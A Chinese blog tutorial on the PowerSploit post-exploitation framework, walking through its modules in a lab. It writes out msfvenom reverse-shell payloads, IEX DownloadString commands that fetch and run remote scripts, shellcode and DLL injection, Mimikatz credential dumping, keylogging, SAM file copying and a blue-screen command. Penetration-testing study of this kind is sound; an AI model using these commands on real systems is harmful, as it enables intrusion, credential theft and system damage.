<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>PowerShell-PowerSploit - Guko's Blog</title><meta name="description" content="PowerSploit是一款基于PowerShell的后渗透（Post-Exploitation）框架软件，包含一些PowerShell攻击脚本，用于渗透种的信息侦查、权限提升、权限维持0x01 PowerSploit安装Github地址:https://github.com/PowerShellM"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PowerShell-PowerSploit</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PowerShell-PowerSploit</h1><div class="post-meta">2020-04-04<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>PowerSploit是一款基于PowerShell的后渗透（Post-Exploitation）框架软件，包含一些PowerShell攻击脚本，用于渗透种的信息侦查、权限提升、权限维持</p>
<a id="more"></a>

<h4 id="0x01-PowerSploit安装"><a href="#0x01-PowerSploit安装" class="headerlink" title="0x01 PowerSploit安装"></a>0x01 PowerSploit安装</h4><p>Github地址:<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p>下载</p>
<p><img src="/2020/04/04/PowerShell-PowerSploit/1.png" alt></p>
<p>进入PowerSploit目录使用python开启http服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd PowerSploit</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/2.png" alt></p>
<h5 id="powershell脚本分类以及功能"><a href="#powershell脚本分类以及功能" class="headerlink" title="powershell脚本分类以及功能"></a>powershell脚本分类以及功能</h5><p><strong>一、AntivirusBypass(发现杀软查杀特征)</strong></p>
<ul>
<li>Find-AVSignature   发现杀软的签名</li>
</ul>
<p><strong>二、CodeExecution(在目标主机执行代码)</strong></p>
<ul>
<li><p>Invoke-DllInjection.psDLL 注入脚本 注意dll架构要与目标进程相符，同时要具备相应的权限</p>
</li>
<li><p>Invoke-ReflectivePEInjection.ps1   反射型注入 将Windows PE文件（DLL / EXE）反射加载到powershell进程中，或反射地将DLL注入远程进程</p>
</li>
<li><p>Invoke-Shellcode.ps1   将shellcode插入您选择的进程ID或本地PowerShell中</p>
</li>
<li><p>Invoke-WmiCommand.ps1  在目标主机使用wmi执行命令</p>
</li>
</ul>
<p><strong>三、Exfiltration(信息收集)    这个文件夹主要是收集目标主机上的信息</strong></p>
<ul>
<li>Out-Minidump.ps1              生成一个进程的全内存小数据库</li>
<li>Get-VaultCredential.ps1 显示Windows徽标凭据对象，包括明文Web凭据</li>
<li>Get-Keystrokes.ps1       记录按键，时间和活动窗口</li>
<li>Get-GPPPassword.ps1          检索通过组策略首选项推送的帐户的明文密码和其他信息</li>
<li>Get-GPPAutologon.ps1        如果通过组策略首选项推送，则从registry.xml检索自动登录用户名和密码</li>
<li>Get-TimedScreenshot.ps1    这是一个以定期间隔拍摄屏幕并将其保存到文件夹的功能</li>
<li>Invoke-Mimikatz.ps1            抓取主机密码</li>
<li>Invoke-NinjaCopy.ps1          通过读取原始卷并解析NTFS结构，从NTFS分区卷复制文件</li>
<li>Invoke-CredentialInjection.ps1    使用明文凭据创建登录，而不会触发可疑事件ID 4648（显式凭证登录）</li>
<li>Invoke-TokenManipulation.ps1         列出可用的登录令牌。与其他用户创建进程登录令牌，并模仿当前线程中的登录令牌</li>
<li>Get-MicrophoneAudio.ps1        通过麦克风记录声音</li>
<li>VolumeShadowCopyTools.ps1         </li>
</ul>
<p><strong>四、Recon(信息侦察)   这个文件夹主要是以目标主机为跳板进行内网主机侦察</strong></p>
<ul>
<li>Invoke-Portscan.ps1   端口扫描</li>
<li>Get-HttpStatus.ps1      返回指定路径的HTTP状态代码和完整URL，并附带字典文件</li>
<li>Invoke-ReverseDnsLookup.ps1  扫描DNS PTR记录的IP地址范围</li>
<li>PowerView.ps1       PowerView是一系列执行网络和Windows域枚举和利用的功能</li>
<li>Get-ComputerDetails   获得登录信息</li>
</ul>
<p><strong>五、ScriptModification(在目标主机创建或修改脚本代码)</strong></p>
<ul>
<li>Out-EncodedCommand.ps1    将脚本或代码块编码，并为PowerShell有效载荷脚本生成命令行输出</li>
<li>Out-EncryptedScript.ps1   加密文本文件/脚本</li>
<li>Out-CompressedDll.ps1   压缩，Base-64编码，并输出生成的代码，以将受管理的DLL加载到内存中</li>
<li>Remove-Comments.ps1       从脚本中删除注释和多余的空白</li>
</ul>
<p><strong>六、Persistence(后门脚本权限维持)</strong></p>
<ul>
<li>New-UserPersistenceOption  为添加持久性函数配置用户级持久性选项。</li>
<li>New-ElevatedPersistenceOption   为添加持久性函数配置提升的持久性选项。</li>
<li>Add-Persistence    向脚本添加持久性功能</li>
<li>Install-SSP        安装安全支持提供程序（ssp）dll</li>
<li>Get-SecurityPackages</li>
</ul>
<p><strong>七、Privesc(提权)</strong></p>
<ul>
<li>PowerUP: 寻找目标主机windows服务漏洞进行提权的实用脚本</li>
<li>Get-System</li>
</ul>
<p><strong>八、Mayhem（蓝屏等破坏性脚本）</strong></p>
<ul>
<li>Set-MasterBootRecord   选择的消息覆写主引导记录</li>
<li>Set-CriticalProcess  退出powershell时使系统蓝屏</li>
</ul>
<h4 id="0x02-CodeExecution——代码执行"><a href="#0x02-CodeExecution——代码执行" class="headerlink" title="0x02 CodeExecution——代码执行"></a>0x02 CodeExecution——代码执行</h4><p>*<em>1.Invoke-Shellcode *</em></p>
<p>CodeExecution模块下的Invoke-Shellcode脚本常用于将ShellCode插入指定的进程ID或本地powershell中，如下为两种常用反弹meterpreter shell方式</p>
<p>（1）直接执行ShellCode反弹meterpreter shell</p>
<p>在 msf中使用<code>reverse_https</code>模块进行反弹，如下为设置内容</p>
<p><img src="/2020/04/04/PowerShell-PowerSploit/3.png" alt></p>
<p>使用msfvenom命令生成一个powershell脚本木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.197.229 LPORT=4444 -f powershell -o /root/PowerSploit/pentest</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/4.png" alt></p>
<p>在目标机器的powershell下输入以下命令下载脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.197.229:8000/CodeExecution/Invoke-Shellcode.ps1&quot;)</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.197.229:8000/mao&quot;)</span><br><span class="line">Invoke-Shellcode -Shellcode ($buf) -Force</span><br><span class="line"></span><br><span class="line">//也可以用另一种方式</span><br><span class="line">Invoke-Shellcode -Shellcode @()</span><br></pre></td></tr></table></figure>

<p>这样就可反弹回shell到Matsploit</p>
<p>(2) 指定进程注入shellcode反弹meterpreter shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.197.229:8000/CodeExecution/Invoke-Shellcode.ps1&quot;)</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.197.229:8000/mao&quot;)</span><br><span class="line"></span><br><span class="line">Get-Process //查找可注入进程</span><br><span class="line"></span><br><span class="line">Invoke-Shellcode -ProcessId 7620 -Shellcode ($buf) -Force</span><br></pre></td></tr></table></figure>

<p><strong>2.Invoke-Dlllnjection</strong></p>
<p>Code Execution模块下的Invoke-Dlllnjection脚本，为DLL注入脚本</p>
<p>下载脚本到目标机，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.197.229:8000/CodeExecution/Invoke-DllInjection.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>在kali中生成一个DLL注入脚本,并启用监听,这里使用<code>reverse_tcp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.197.229 LPORT=4444 -f dll -o /root/PowerSploit/pentest.dll</span><br><span class="line">//启用监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/5.png" alt="5"></p>
<p>在目标机上开启一个隐藏进程并注入DLL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start-process C:\Windows\System32\notepad.exe -WindowStyle Hidden 开启隐藏进程</span><br><span class="line">Get-Process notepad //查看隐藏进程ID用于注入DLL</span><br><span class="line">Invoke-DllInjection -ProcessID 6552 -Dll C:\Users\Admin\Downloads\mao.dll //注入DLL</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/31.png" alt></p>
<p>正常的话会返回一个merterpreter shell</p>
<h4 id="0x03-Recon——信息侦察"><a href="#0x03-Recon——信息侦察" class="headerlink" title="0x03 Recon——信息侦察"></a>0x03 Recon——信息侦察</h4><h5 id="调用invoke-Portscan扫描内网主机的端口"><a href="#调用invoke-Portscan扫描内网主机的端口" class="headerlink" title="调用invoke-Portscan扫描内网主机的端口"></a>调用invoke-Portscan扫描内网主机的端口</h5><p>远程加载位于kali上的<code>Invoke-Portscan.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Recon/Invoke-Portscan.ps1&quot;)</span><br><span class="line">get-hrlp Invoke-Portscan //查看帮助</span><br><span class="line">get-help Invoke-Portscan -examples //查看用法示例</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/8.png" alt><br>扫描Top50的端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Portscan -Hosts 192.168.1.1 -TopPorts 50 -Threads 50</span><br><span class="line">Invoke-Portscan -Hosts 192.168.1.7 -Ports &quot;8000&quot; //仅仅扫描8000端口是否开放</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/6.png" alt></p>
<h5 id="调用Invoke-ReverseDnsLookup反向DNS查找"><a href="#调用Invoke-ReverseDnsLookup反向DNS查找" class="headerlink" title="调用Invoke-ReverseDnsLookup反向DNS查找"></a>调用Invoke-ReverseDnsLookup反向DNS查找</h5><p>远程加载位于kali上的<code>ReverseDnsLookup.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1&quot;)</span><br><span class="line">get-help Invoke-ReverseDnsLookup //查看帮助</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/7.png" alt></p>
<p>通过ip查找到对应主机名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ReverseDnsLookup &quot;192.168.1.7,192.168.1.2&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/9.png" alt></p>
<p>Recon还有Get-HttpStatus进行网站目录检测，Get-ComputerDetails获取主机登录信息等脚本</p>
<h4 id="0x04-Exfiltration——信息收集"><a href="#0x04-Exfiltration——信息收集" class="headerlink" title="0x04 Exfiltration——信息收集"></a>0x04 Exfiltration——信息收集</h4><h5 id="调用Invoke-Mimikatz抓取内存明文密码（需要管理员权限）"><a href="#调用Invoke-Mimikatz抓取内存明文密码（需要管理员权限）" class="headerlink" title="调用Invoke-Mimikatz抓取内存明文密码（需要管理员权限）"></a>调用Invoke-Mimikatz抓取内存明文密码（需要管理员权限）</h5><p>远程加载位于kali上的<code>Invoke-Mimikatz.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>运行如下命令，抓取密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Mimikatz -DumpCreds</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/10.png" alt></p>
<h5 id="调用Get-Keystrokes键盘记录-详细的鼠标键盘记录"><a href="#调用Get-Keystrokes键盘记录-详细的鼠标键盘记录" class="headerlink" title="调用Get-Keystrokes键盘记录(详细的鼠标键盘记录)"></a>调用Get-Keystrokes键盘记录(详细的鼠标键盘记录)</h5><p>远程加载位于kali上的<code>Get-Keystrokes.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Exfiltration/Get-Keystrokes.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>运行<code>Get-Keystrokes</code>并把结果记录保存到一个文件,试着运行一些字符测试一下，可以看到已被记录下来了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Keystrokes C:\Users\testuser\Desktop\pentest.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/11.png" alt></p>
<h5 id="调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）"><a href="#调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）" class="headerlink" title="调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）"></a>调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）</h5><p>远程加载位于kali上的<code>Invoke-NinjaCopy.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>运行<code>Invoke-NinjaCopy</code>脚本把SAM复制到桌面上，下面可以看到已经成功复制SAM文件，普通的复制是不能复制系统限制文件的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\SAM&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/12.png" alt></p>
<h5 id="调用Get-TimedScreenshot进行屏幕记录"><a href="#调用Get-TimedScreenshot进行屏幕记录" class="headerlink" title="调用Get-TimedScreenshot进行屏幕记录"></a>调用Get-TimedScreenshot进行屏幕记录</h5><p>远程加载位于kali上的<code>Get-TimedScreenshot.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Exfiltration/Get-TimedScreenshot.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>运行<code>Get-TimedScreenshot</code>脚本截图所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-TimedScreenshot -Path C:\Users\testuser\Desktop -Interval 30 -EndTime 14:00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/13.png" alt></p>
<h4 id="0x05-ScriptModification——脚本修改"><a href="#0x05-ScriptModification——脚本修改" class="headerlink" title="0x05 ScriptModification——脚本修改"></a>0x05 ScriptModification——脚本修改</h4><h5 id="调用Out-CompressedDll将dll压缩并base64编码"><a href="#调用Out-CompressedDll将dll压缩并base64编码" class="headerlink" title="调用Out-CompressedDll将dll压缩并base64编码"></a>调用Out-CompressedDll将dll压缩并base64编码</h5><p>远程加载<code>Out-CompressedDll.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/ScriptModification/Out-CompressedDll.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>运行脚本<code>Out-CompressedDll</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-CompressedDll -FilePath C:\Users\testuser\Desktop\pentest.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/14.png" alt></p>
<h5 id="调用Out-EncodedCommand将脚本或代码块编码"><a href="#调用Out-EncodedCommand将脚本或代码块编码" class="headerlink" title="调用Out-EncodedCommand将脚本或代码块编码"></a>调用Out-EncodedCommand将脚本或代码块编码</h5><p>远程加载<code>Out-EncodedCommand.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/ScriptModification/Out-EncodedCommand.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/15.png" alt></p>
<p>脚本块编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-EncodedCommand -ScriptBlock &#123;Write-Host &apos;whomai&apos;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/16.png" alt></p>
<p>脚本编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-EncodedCommand -Path C:\Users\testuser\Desktop\test.ps1 -EncodedOutput</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/17.png" alt></p>
<h5 id="调用Remove-Comments删除注释和不必要的空白符"><a href="#调用Remove-Comments删除注释和不必要的空白符" class="headerlink" title="调用Remove-Comments删除注释和不必要的空白符"></a>调用Remove-Comments删除注释和不必要的空白符</h5><p>远程加载<code>Remove-Comments.ps1</code>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/ScriptModification/Remove-Comments.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>运行<code>Remove-Comments</code>脚本，删除脚本中的空白和注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-Comments -Path C:\Users\testuser\Desktop\test.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/18.png" alt></p>
<h4 id="0x06-Mayhem"><a href="#0x06-Mayhem" class="headerlink" title="0x06 Mayhem"></a>0x06 Mayhem</h4><p>使用Mayhem模块需要先将Mayhem放到<code>C:\Windows\System32\WindowsPowerShell\v1.0\Modules</code>下,然后需要导入模块</p>
<p><img src="/2020/04/04/PowerShell-PowerSploit/19.png" alt></p>
<p>导入<code>Mayhem模块</code>，并查看帮助命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module Mayhem</span><br><span class="line">Get-Command -Module Mayhem</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/20.png" alt></p>
<p>使用命令<code>Set-CriticalProcess</code>,退出powershell时使系统蓝屏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-CriticalProcess</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/21.png" alt></p>
<p><img src="/2020/04/04/PowerShell-PowerSploit/22.png" alt></p>
<h4 id="0x07-PowerUp模块"><a href="#0x07-PowerUp模块" class="headerlink" title="0x07 PowerUp模块"></a>0x07 PowerUp模块</h4><p>Privesc模块下的PowerUp脚本，有许多用来寻找目标主机Window服务漏洞进行提权的实用脚本</p>
<p>在windows下一般可以通过内核漏洞来提升权限，但碰到无法通过内核漏洞提权所处服务器的情况，就需要利用脆弱的windows服务提权，或利用常见的系统服务，通过其继承的系统权限来完成提权，此框架在内核提权行不通的时候，帮助我们寻找服务器的脆弱点，进行通过脆弱点实现提权的目的</p>
<p>查看模块的详细说明，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-help [cmdlet] -full</span><br><span class="line">get-help Invoke-AllChecks -full //举例</span><br><span class="line">Get-Command -Module powerup //查看所有模块</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/23.png" alt></p>
<p><img src="/2020/04/04/PowerShell-PowerSploit/25.png" alt></p>
<p><strong>1.Invoke-AllChecks</strong></p>
<p>执行PowerUp所有脚本来检查目标主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/24.png" alt></p>
<p><strong>2.Find-DLLHijack</strong></p>
<p>检查每个进程所加载的模块，返回已经加载且不在其可执行目录的模块的目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find-DLLHijack #返回所有的dll路径</span><br><span class="line">Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles #返回排除C:\Windows\*； C:\Program Files\*；C:\Program Files (x86)\*以外的dll路径</span><br><span class="line">Find-DLLHijack -ExcludeOwned #返回不属于当前用户所有进程权限的dll路径</span><br></pre></td></tr></table></figure>

<p><strong>3.Find-PathDLLHijack</strong></p>
<p>检查当前<code>%PATH%</code>是否存在哪些目录是当前用户可以写入的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-Pathdllhijack</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/30.png" alt></p>
<p><strong>4.Get-ApplicationHost</strong></p>
<p>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ApplicationHost</span><br><span class="line">Get-ApplicationHost | Format-Table -Autosize # 列表显示</span><br></pre></td></tr></table></figure>

<p><strong>5.Get-RegistryAlwaysInstallElevated</strong></p>
<p>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-RegistryAlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p><strong>6.Get-RegistryAutoLogon</strong></p>
<p>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-RegistryAutoLogon</span><br></pre></td></tr></table></figure>

<p><strong>7.Get-ServiceDetail</strong></p>
<p>返回某服务的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ServiceDetail -ServiceName Dhcp //获取DHCP服务的详细信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/26.png" alt></p>
<p><strong>8.Get-ServiceFilePermission</strong></p>
<p>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ServiceFilePermission</span><br></pre></td></tr></table></figure>

<p><strong>9.Test-ServiceDaclPermission</strong></p>
<p>检查所有可用的服务，并尝试对这些打开的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test-ServiceDaclPermission</span><br></pre></td></tr></table></figure>

<p><strong>10.Get-ServiceUnquoted</strong></p>
<p>检查服务路径，返回包含空格但是不带引号的服务路径。</p>
<p>此处利用的windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升。</p>
<p>比如<code>C:\program files\hello.exe</code>会被解释为<code>C:\program.exe以及C:\program files\hello.exe</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ServiceUnquoted</span><br></pre></td></tr></table></figure>

<p><strong>11.Get-UnattendedInstallFile</strong></p>
<p>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据。这些文件包括：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">c:\sysprep\sysprep.inf</span><br><span class="line">c:\sysprep.inf</span><br><span class="line">c:\windows\Panther\Unattended.xml</span><br><span class="line">c:\windows\Panther\Unattend\Unattended.xml</span><br><span class="line">c:\windows\Panther\Unattend.xml</span><br><span class="line">c:\windows\Panther\Unattend\Unattend.xml</span><br><span class="line">c:\windows\System32\Sysprep\unattend.xml</span><br><span class="line">c:\windows\System32\Sysprep\Panther\unattend.xml</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-UnattendedInstallFile</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/27.png" alt></p>
<p><strong>12.Get-ModifiableRegistryAutoRun</strong></p>
<p>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径。</p>
